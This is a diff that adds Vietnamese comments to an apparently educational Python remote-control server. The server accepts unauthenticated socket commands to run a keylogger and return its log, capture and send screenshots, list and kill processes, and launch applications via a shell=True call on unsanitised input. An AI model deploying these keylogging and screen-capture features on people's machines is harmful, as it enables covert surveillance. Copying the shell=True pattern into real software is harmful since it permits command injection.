@@ -1,14 +1,14 @@
 import io
 import csv
 import json
-import psutil
-import socket
-import threading
-import subprocess
+import psutil  # Để quản lý thông tin về quá trình và tài nguyên hệ thống
+import socket  # Để tạo và quản lý kết nối socket
+import threading  # Để tạo và quản lý luồng xử lý đồng thời
+import subprocess  # Để thực hiện các lệnh hệ thống
 from PIL import ImageGrab  # Để chụp màn hình
-from keylogger import Keylogger
-from shutdown import ServerShutdownWindow
-import psutil
+from keylogger import Keylogger  # Module tự viết để ghi nhận các phím được đánh trên máy tính
+from shutdown import ServerShutdownWindow  # Module tự viết để tạo cửa sổ tắt máy
+import psutil  # Thư viện quản lý thông tin về quá trình và tài nguyên hệ thống
 
 class Server:
     def __init__(self):
@@ -28,13 +28,15 @@ class Server:
 
 
     def start_server(self):
+        # Tạo socket và liên kết nó với địa chỉ IP của máy chủ và cổng 12345
         self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.bind((self.server_ip, 12345))
-        self.socket.listen(1)
+        self.socket.listen(1)  # Lắng nghe kết nối từ máy khách
         print("Server đang chạy và lắng nghe kết nối.")
         self.running = True
         while self.running:
             try:
+                # Chấp nhận kết nối từ máy khách và trả về đối tượng socket mới
                 client_socket, client_address = self.socket.accept()
                 print(f"Đã kết nối từ {client_address[0]}:{client_address[1]}")
 
@@ -52,29 +54,47 @@ class Server:
     def handle_client(self, client_socket):
         try:
             while True:
+                # Nhận dữ liệu từ máy khách (không quá 1024 bytes)
                 data = client_socket.recv(1024)
+
+                # Kiểm tra nếu không còn dữ liệu hoặc kết nối đã đóng, thoát khỏi vòng lặp
                 if not data:
                     break
+
+                # Giải mã dữ liệu nhận được từ bytes sang chuỗi
                 data = data.decode()
+
+                # Xử lý yêu cầu từ máy khách bằng cách gọi hàm process_request
                 response = self.process_request(data, client_socket)
+
+                # Nếu có phản hồi từ hàm process_request, gửi phản hồi về máy khách
                 if response is not None:
                     client_socket.sendall(response.encode())
+
+        # Xử lý ngoại lệ trong quá trình xử lý yêu cầu từ máy khách
         except Exception as e:
             print(f"Lỗi xử lý yêu cầu từ client: {str(e)}")
+
+        # Cuối cùng, đảm bảo đóng kết nối với máy khách
         finally:
             client_socket.close()
 
+
     def process_request(self, request, client_socket):
         if request == "start":
+            # Bắt đầu ghi log các phím được nhấn
             self.keylogger.start()
             return ""
         elif request == "stop":
+            # Dừng ghi log các phím được nhấn
             self.keylogger.stop()
             return ""
         elif request == "clear":
+            # Xóa dữ liệu log các phím đã ghi
             self.keylogger.clear_log()
             return ""
         elif request == "print":
+            # Đọc và trả về dữ liệu log các phím đã ghi
             logs = self.keylogger.read_log()
             return logs
         elif request == "screenshot":
@@ -82,54 +102,72 @@ class Server:
             screenshot = self.capture_screenshot()
             client_socket.sendall(str(len(screenshot)).encode())  # Gửi kích thước trước
             client_socket.sendall(screenshot)  # Gửi dữ liệu hình ảnh
-            return None  # Không cần trả về gì ở đây
+            return None  # Không cần trả về gì ở đây (gửi hình ảnh rồi)
         elif request == "shutdown":
+            # Hiển thị cửa sổ tắt máy chủ và thực hiện tắt máy chủ khi cần
             shutdown_window = ServerShutdownWindow(self)
             shutdown_window.start()
             return "Server đã tắt"
         elif request == "apps":
+            # Lấy danh sách các ứng dụng đang chạy trên máy chủ
             apps = self.get_running_applications()
             return json.dumps(apps)
         elif request == "processus":
+            # Lấy danh sách các tiến trình đang chạy trên máy chủ
             processes = self.get_running_processus()
             return json.dumps(processes)
         elif request.startswith("kill"):
             try:
                 _, pid_str = request.split(" ", 1)  # Tách lệnh và PID
                 pid = int(pid_str)  # Chuyển PID thành số nguyên
-                return self.kill(pid)
+                return self.kill(pid)  # Tiến hành kết thúc tiến trình với PID đã chỉ định
             except ValueError:
                 return "Invalid PID."
         elif request.startswith("start"):
             try:
                 _, app_name = request.split(" ", 1)  # Tách lệnh và tên ứng dụng
-                subprocess.Popen(["start", app_name], shell=True)
+                subprocess.Popen(["start", app_name], shell=True)  # Khởi chạy ứng dụng
                 return f"Started application: {app_name}"
             except ValueError:
                 return "Invalid application name."
         else:
-            return "Invalid request."
+            return "Invalid request."  # Trường hợp yêu cầu không hợp lệ
+
 
     # kill process
     def kill(self, pid):
         try:
+            # Tạo đối tượng Process sử dụng thư viện psutil để quản lý tiến trình với PID cụ thể
             process = psutil.Process(pid)
-            process.terminate()  # Kết thúc quy trình
+            
+            # Kết thúc tiến trình bằng cách gọi phương thức terminate()
+            process.terminate()
+            
+            # Trả về thông báo xác nhận tiến trình đã kết thúc
             return f"Process with PID {pid} terminated."
         except psutil.NoSuchProcess:
-                return "Process not found."
+            # Xử lý ngoại lệ nếu không tìm thấy tiến trình với PID đã cho
+            return "Process not found."
     
     # screenshot   
     def capture_screenshot(self):
         try:
+            # Chụp màn hình bằng cách sử dụng phương thức grab() từ thư viện ImageGrab
             screenshot = ImageGrab.grab()
+            
+            # Tạo một đối tượng BytesIO để lưu trữ dữ liệu hình ảnh dưới dạng bytes
             image_byte_array = io.BytesIO()
+            
+            # Lưu hình ảnh chụp màn hình vào đối tượng BytesIO với định dạng PNG
             screenshot.save(image_byte_array, format="PNG")
+            
+            # Trả về dữ liệu hình ảnh dưới dạng bytes
             return image_byte_array.getvalue()
         except Exception as e:
+            # Xử lý ngoại lệ nếu có lỗi trong quá trình chụp màn hình
             return f"Error capturing screenshot: {str(e)}"
+    
     # running process
-   
     def get_running_processus(self):
         try:
             # Sử dụng PowerShell để lấy thông tin về tiến trình và số luồng
@@ -149,12 +187,13 @@ class Server:
         
                 # Thêm thông tin vào danh sách mới
                 processus.append({'ProcessName': process_name, 'PID': pid, 'ThreadCount': thread_count})
-           
+        
             return processus
 
         except subprocess.CalledProcessError as e:
-            print(f"Error: {e}")
+            print(f"Lỗi: {e}")
             return []
+    
     # running apps, same as process
     def get_running_applications(self):
         try:
@@ -179,7 +218,7 @@ class Server:
             return apps_list
 
         except subprocess.CalledProcessError as e:
-            print(f"Error: {e}")
+            print(f"Lỗi: {e}")
             return []
 
         
